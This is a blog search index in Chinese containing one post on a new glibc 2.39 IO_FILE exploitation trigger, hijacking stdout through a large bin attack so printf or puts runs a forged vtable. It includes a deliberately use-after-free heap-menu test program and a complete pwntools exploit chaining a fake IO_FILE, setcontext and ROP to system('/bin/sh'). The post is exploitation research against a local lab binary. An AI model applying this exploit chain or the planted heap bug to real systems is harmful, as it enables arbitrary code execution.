<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>一类新的IO_FILE利用触发方式</title>
    <link href="/2025/02/14/post-1/"/>
    <url>/2025/02/14/post-1/</url>
    
    <content type="html"><![CDATA[<p>之前学IO的时候就有这个想法了，过了将近三个月才有时间去验证🥲</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>众所周知，在IO攻击的触发方法中，主要分为执行<code>exit</code>函数和通过攻击<code>stderr</code>后执行<code>__malloc_assert</code>。在<code>glibc 2.36</code>之后<code>__malloc_assert</code>被移除，<code>large bin chunk</code>中，较为热门的<code>FSOP</code>和<code>rtld_global</code>相关的攻击都相当依赖<code>exit</code>函数。本文将分享一个关注攻击<code>stdout</code>的视角，希望能给各位师傅在高版本的堆利用中提供更多方向的尝试。</p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>在<code>glibc</code>中，标准IO库函数如<code>gets</code>, <code>printf</code>, <code>puts</code>, <code>scanf</code>等，它们的执行过程中都会通过<code>stdin</code>或<code>stdout</code>调用<code>IO_file_jumps</code>虚表中的函数。我们用<code>puts</code>来举例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc 2.39-0ubuntu8.3 /libio/ioputs.c at line 31:46</span><br><span class="hljs-type">int</span> <br>_IO_puts(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)<br>&#123;<br>  <span class="hljs-type">int</span> result = EOF;<br>  <span class="hljs-type">size_t</span> len = <span class="hljs-built_in">strlen</span>(str);<br>  _IO_acquire_lock(<span class="hljs-built_in">stdout</span>);<br>  <br>  <span class="hljs-keyword">if</span> ((_IO_vtable_offset(<span class="hljs-built_in">stdout</span>) != <span class="hljs-number">0</span> <br>  || _IO_fwide(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">-1</span>) == <span class="hljs-number">-1</span>) <br>      &amp;&amp; _IO_sputn(<span class="hljs-built_in">stdout</span>, str, len) == len <br>      &amp;&amp; _IO_putc_unlocked(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-built_in">stdout</span>) != EOF)<br>    result = MIN(INT_MAX, len + <span class="hljs-number">1</span>);<br><br>  _IO_release_lock(<span class="hljs-built_in">stdout</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>其中<code>_IO_sputn</code>是一个宏，展开后是用于<code>call</code>对应<code>_IO_FILE</code>中<code>vtable</code>中<code>_IO_sputn</code>偏移的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN(__fp, __s, __n)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2(__xsputn, FP, DATA, N)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC)(THIS, X1, X2)</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span><br><span class="hljs-meta">  (IO_validate_vtable                                                   \</span><br><span class="hljs-meta">   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus(THIS)\</span><br><span class="hljs-meta">     + (THIS)-&gt;_vtable_offset)))</span><br><br></code></pre></td></tr></table></figure><p>在这里会<code>call</code>到<code>_IO_file_jumps</code>中的<code>_IO_file_sputn</code></p><p>而<code>stdout</code>与<code>stdin</code>和<code>stderr</code>一样，都是对<code>_IO_2_1_stdxx_</code>的封装。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc 2.39-0ubuntu8.3 /libio/stdio.c at line 33:35</span><br>FILE *<span class="hljs-built_in">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;<br>FILE *<span class="hljs-built_in">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;<br>FILE *<span class="hljs-built_in">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;<br></code></pre></td></tr></table></figure><p>因此理论上来说，我们可以通过包括但不限于<code>large bin attack</code>覆盖<code>stdin</code>或<code>stdout</code>，在执行相关标准IO库函数的时候触发攻击。</p><h2 id="研究方法"><a href="#研究方法" class="headerlink" title="研究方法"></a>研究方法</h2><p>标准IO库函数很多，如果我们要一个个去读源代码来找他们执行的第一个<code>IO_FILE</code>虚表函数是比较困难的。因此在实际的探索中，我是用gdb将所有<code>IO_FILE_jumps</code>中的函数都打了断点。这样可以方便的看出来，每个库函数调用的第一个虚表函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b _IO_file_finish</span><br><span class="hljs-string">b _IO_file_overflow</span><br><span class="hljs-string">b _IO_file_underflow</span><br><span class="hljs-string">b _IO_default_uflow</span><br><span class="hljs-string">b _IO_default_pbackfail</span><br><span class="hljs-string">b _IO_file_xsputn</span><br><span class="hljs-string">b _IO_file_xsgetn</span><br><span class="hljs-string">b _IO_file_seekoff</span><br><span class="hljs-string">b _IO_default_seekpos</span><br><span class="hljs-string">b _IO_file_setbuf</span><br><span class="hljs-string">b _IO_file_sync</span><br><span class="hljs-string">b _IO_file_doallocate</span><br><span class="hljs-string">b _IO_file_read</span><br><span class="hljs-string">b _IO_file_write</span><br><span class="hljs-string">b _IO_file_seek</span><br><span class="hljs-string">b _IO_file_close</span><br><span class="hljs-string">b _IO_file_stat</span><br><span class="hljs-string">b _IO_default_showmanyc</span><br><span class="hljs-string">b _IO_default_imbue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>更好的办法是保存成一个文件，<code>break</code> 到想要的函数再<code>source</code>一下</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h4 id="Heap-menu"><a href="#Heap-menu" class="headerlink" title="Heap-menu"></a>Heap-menu</h4><p>环境:<code>glibc 2.39-0ubuntu8.3</code></p><p>我实现了一个最简单的菜单堆用于测试，包含任意size大小申请，delete部分有UAF。源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_CHUNKS 100</span><br><br><span class="hljs-type">void</span> *chunks[MAX_CHUNKS];<br><span class="hljs-type">int</span> size_list[MAX_CHUNKS];<br><span class="hljs-type">int</span> chunk_count = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">malloc_chunk</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (chunk_count &gt;= MAX_CHUNKS) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Maximum chunks reached.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter size to malloc: \n&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%zx&quot;</span>, &amp;size);<br>    chunks[chunk_count] = <span class="hljs-built_in">malloc</span>(size); <br>    <span class="hljs-keyword">if</span> (chunks[chunk_count]) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocated chunk at index %d\n&quot;</span>, chunk_count);<br>        size_list[chunk_count] = size;<br>        chunk_count++;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Malloc failed.\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_chunk</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter chunk index to print: \n&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;idx);<br>    <span class="hljs-keyword">if</span> (idx &gt;= <span class="hljs-number">0</span> &amp;&amp; idx &lt; chunk_count) &#123;<br>        write(<span class="hljs-number">1</span>, chunks[idx], size_list[idx]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid index.\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">free_chunk</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter chunk index to free: \n&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;idx);<br>    <span class="hljs-keyword">if</span> (idx &gt;= <span class="hljs-number">0</span> &amp;&amp; idx &lt; chunk_count) &#123;<br>        <span class="hljs-built_in">free</span>(chunks[idx]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid index.\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit_chunk</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter chunk index to edit: \n&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;idx);<br>    <span class="hljs-keyword">if</span> (idx &gt;= <span class="hljs-number">0</span> &amp;&amp; idx &lt; chunk_count) &#123;<br>        read(<span class="hljs-number">0</span>, chunks[idx], size_list[idx]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid index.\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">clear_input_buffer</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">while</span> (getchar() != <span class="hljs-string">&#x27;\n&#x27;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> choice;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nHeap Playground Menu:\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1. Malloc a chunk\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2. Print chunk info\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3. Modify chunk info\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4. Free a chunk\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5. Exit\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter your choice: \n&quot;</span>);<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;choice) != <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// 检查输入</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid input. Please enter a number.\n&quot;</span>);<br>            clear_input_buffer(); <span class="hljs-comment">// 清空输入缓冲区</span><br>            <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// 继续下一次循环</span><br>        &#125;<br><br>        <span class="hljs-keyword">switch</span> (choice) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: malloc_chunk(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: print_chunk(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: edit_chunk(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: free_chunk(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-comment">// case 5: exit(0);</span><br>            <span class="hljs-keyword">default</span>: <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid choice.\n&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这次我们尝试使用<code>large bin attack</code> 攻击<code>stdout</code>，由于<code>large bin attack</code>的最后一步是<code>malloc chunk</code>。接下来第一个使用<code>stdout</code>的是<code>printf</code>。我们将断点打到<code>printf</code>，并用脚本打上所有断点，查看<code>printf</code>执行的第一个stdio库函数</p><p><img src="/./post-1/1.png"></p><p>可以发现是<code>_IO_file_xsputn</code>，接下来我们调整<code>fake_IO_FILE-&gt;vtable</code>，构造<code>house of apple2</code></p><p>exp:</p><blockquote><p>偷懒抄了刚学FSOP时候的模板，large bin leak 和attack的部分写的超臃肿，滑轨了</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>io = process(<span class="hljs-string">&quot;./heap-menu&quot;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/home/new/gdb_commands.gdb&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> gdb_file:<br>    gdb_file.write(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">set debug-file-directory </span><br><span class="hljs-string">set directories </span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>) <span class="hljs-comment"># /lib/x86_64-linux-gnu/libc.so.6</span><br><br><span class="hljs-comment"># gdb.attach(io)</span><br><br>index = -<span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choice</span>(<span class="hljs-params">idx</span>):<br>    io.sendlineafter(<span class="hljs-string">b&quot;Enter your choice:&quot;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    <span class="hljs-keyword">global</span> index<br>    choice(<span class="hljs-number">1</span>)<br>    io.sendlineafter(<span class="hljs-string">b&quot;Enter size to malloc:&quot;</span>, <span class="hljs-built_in">hex</span>(size).encode())<br>    index = index + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    choice(<span class="hljs-number">4</span>)<br>    io.sendlineafter(<span class="hljs-string">b&quot;Enter chunk index to free:&quot;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    choice(<span class="hljs-number">3</span>)<br>    io.sendlineafter(<span class="hljs-string">b&quot;Enter chunk index to edit: &quot;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    io.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    choice(<span class="hljs-number">2</span>)<br>    io.sendlineafter(<span class="hljs-string">b&quot;Enter chunk index to print:&quot;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">large_bin_leak</span>(<span class="hljs-params">libc_offset = <span class="hljs-literal">None</span>, heap_offset = <span class="hljs-literal">None</span></span>):<br>    chunk = add(<span class="hljs-number">0x500</span>)<br>    add(<span class="hljs-number">0x20</span>)<br>    free(chunk)<br>    add(<span class="hljs-number">0x700</span>)<br>    show(chunk)<br>    <br>    arena = u64(io.recv(<span class="hljs-number">16</span>)[<span class="hljs-number">8</span>:])<br>    <span class="hljs-keyword">if</span> libc_offset:<br>        libc_address = arena - libc_offset<br>    <span class="hljs-keyword">else</span>:<br>        libc_address = arena<br>        <br>    heap = u64(io.recv(<span class="hljs-number">16</span>)[<span class="hljs-number">8</span>:])<br>    <span class="hljs-keyword">if</span> heap_offset:<br>        heap_base = heap - heap_offset<br>    <span class="hljs-keyword">else</span>:<br>        heap_base = heap<br>    <span class="hljs-keyword">return</span> libc_address, heap_base<br><br>  <br><br>libc.address, heap_base = large_bin_leak(libc_offset = <span class="hljs-number">0x203f50</span>, heap_offset = <span class="hljs-number">0x16b0</span>)<br>success(<span class="hljs-string">f&quot;leak -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)<br>success(<span class="hljs-string">f&quot;heap_base -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap_base)&#125;</span>&quot;</span>)<br>fake_IO_FILE = heap_base + <span class="hljs-number">0x2d40</span><br><br>add(<span class="hljs-number">0x500</span>)<br><br>target_addr = libc.sym[<span class="hljs-string">&#x27;stdout&#x27;</span>]<br>_IO_wfile_jumps = libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>pop_rdi_ret = libc.address + <span class="hljs-number">0x10f75b</span>  <span class="hljs-comment"># pop rdi ; ret</span><br><br><br>_IO_OVERFLOW = <span class="hljs-number">0x18</span><br>_IO_XSPUTN = <span class="hljs-number">0x38</span><br>_IO_UFLOW = <span class="hljs-number">0x28</span><br><br>data1 = flat(&#123;<br>    <span class="hljs-number">0</span>: &#123;<br>        <span class="hljs-number">0x88</span>: heap_base + <span class="hljs-number">0x300</span>, <span class="hljs-comment">#_lock</span><br>        <span class="hljs-number">0xa0</span>: fake_IO_FILE + <span class="hljs-number">0xe0</span>, <span class="hljs-comment">#_wide_data</span><br>        <span class="hljs-number">0xd8</span>: _IO_wfile_jumps + _IO_OVERFLOW - _IO_XSPUTN <span class="hljs-comment"># vtable</span><br>    &#125;,<br>    <span class="hljs-number">0xe0</span>: &#123;<span class="hljs-comment"># _wide_data-&gt;_wide_vtable</span><br>        <span class="hljs-number">0</span>: heap_base + <span class="hljs-number">0x300</span>,<br>        <span class="hljs-number">0x18</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># f-&gt;_wide_data-&gt;_IO_write_base</span><br>        <span class="hljs-number">0x30</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># f-&gt;_wide_data-&gt;_IO_buf_base</span><br>        (<span class="hljs-number">0x1c0</span>-<span class="hljs-number">0xe0</span>):<span class="hljs-number">0x1F80</span>,<br>        <span class="hljs-number">0xe0</span>: fake_IO_FILE + <span class="hljs-number">0x200</span><br>    &#125;,<br>    <span class="hljs-number">0x200</span>: &#123;<br>        <span class="hljs-number">0x38</span>: fake_IO_FILE + <span class="hljs-number">0x270</span>,<br>        <span class="hljs-comment"># 0x176f0e : mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]</span><br>        <span class="hljs-number">0x68</span>: libc.address + <span class="hljs-number">0x176f0e</span><br>    &#125;,<br>    <span class="hljs-number">0x270</span>: &#123;<br>        <span class="hljs-number">0x20</span>: libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+<span class="hljs-number">61</span>,<br>        <span class="hljs-number">0x88</span>: <span class="hljs-number">0x7</span>,<br>        <span class="hljs-number">0xa0</span>: fake_IO_FILE + <span class="hljs-number">0x270</span> + <span class="hljs-number">0xb0</span>,<br>        <span class="hljs-number">0xa8</span>: pop_rdi_ret+<span class="hljs-number">1</span>,<br>    &#125;,<br>    <span class="hljs-number">0x270</span>+<span class="hljs-number">0xb0</span>:&#123;<br>        <span class="hljs-number">0</span>: flat(<br>            p64(pop_rdi_ret),p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))),<br>            p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]),<br>        )<br>    &#125;,<br>&#125;,filler=<span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>trimmed_data = data1[<span class="hljs-number">0x10</span>:]<br><br><span class="hljs-comment"># large bin attack</span><br>large_chunk1 = add(<span class="hljs-number">0x428</span>)<br>add(<span class="hljs-number">0x600</span>)<br>large_chunk2 = add(<span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">0x600</span>)<br>free(large_chunk1)<br>add(<span class="hljs-number">0x600</span>)<br>edit(large_chunk1, <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">3</span> + p64(target_addr - <span class="hljs-number">0x20</span>))<br>edit(large_chunk2, trimmed_data)<br>free(large_chunk2)<br>pause()<br>add(<span class="hljs-number">0x600</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>结果：<br><img src="/./post-1/2.png"></p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>经过测试，<code>printf</code>, <code>puts</code>, <code>putchar</code>等<code>stdout</code>相关的函数都可以通过一次<code>large bin attack</code>完成攻击。但如<code>scanf</code>, <code>getchar</code>等<code>stdin</code>相关的函数都要求<code>IO_FILE</code>中的<code>_IO_read_ptr</code>是一个可写地址。然而对于传统的<code>large bin attack</code>辅助攻击<code>IO_FILE</code>的手段来说，这个0x8的偏移位置一般都是<code>chunk size</code>，需要更多的原语才能进行利用。</p>]]></content>
    
    
    <categories>
      
      <category>glibc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IO_FILE</tag>
      
      <tag>glibc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/02/11/hello-world/"/>
    <url>/2025/02/11/hello-world/</url>
    
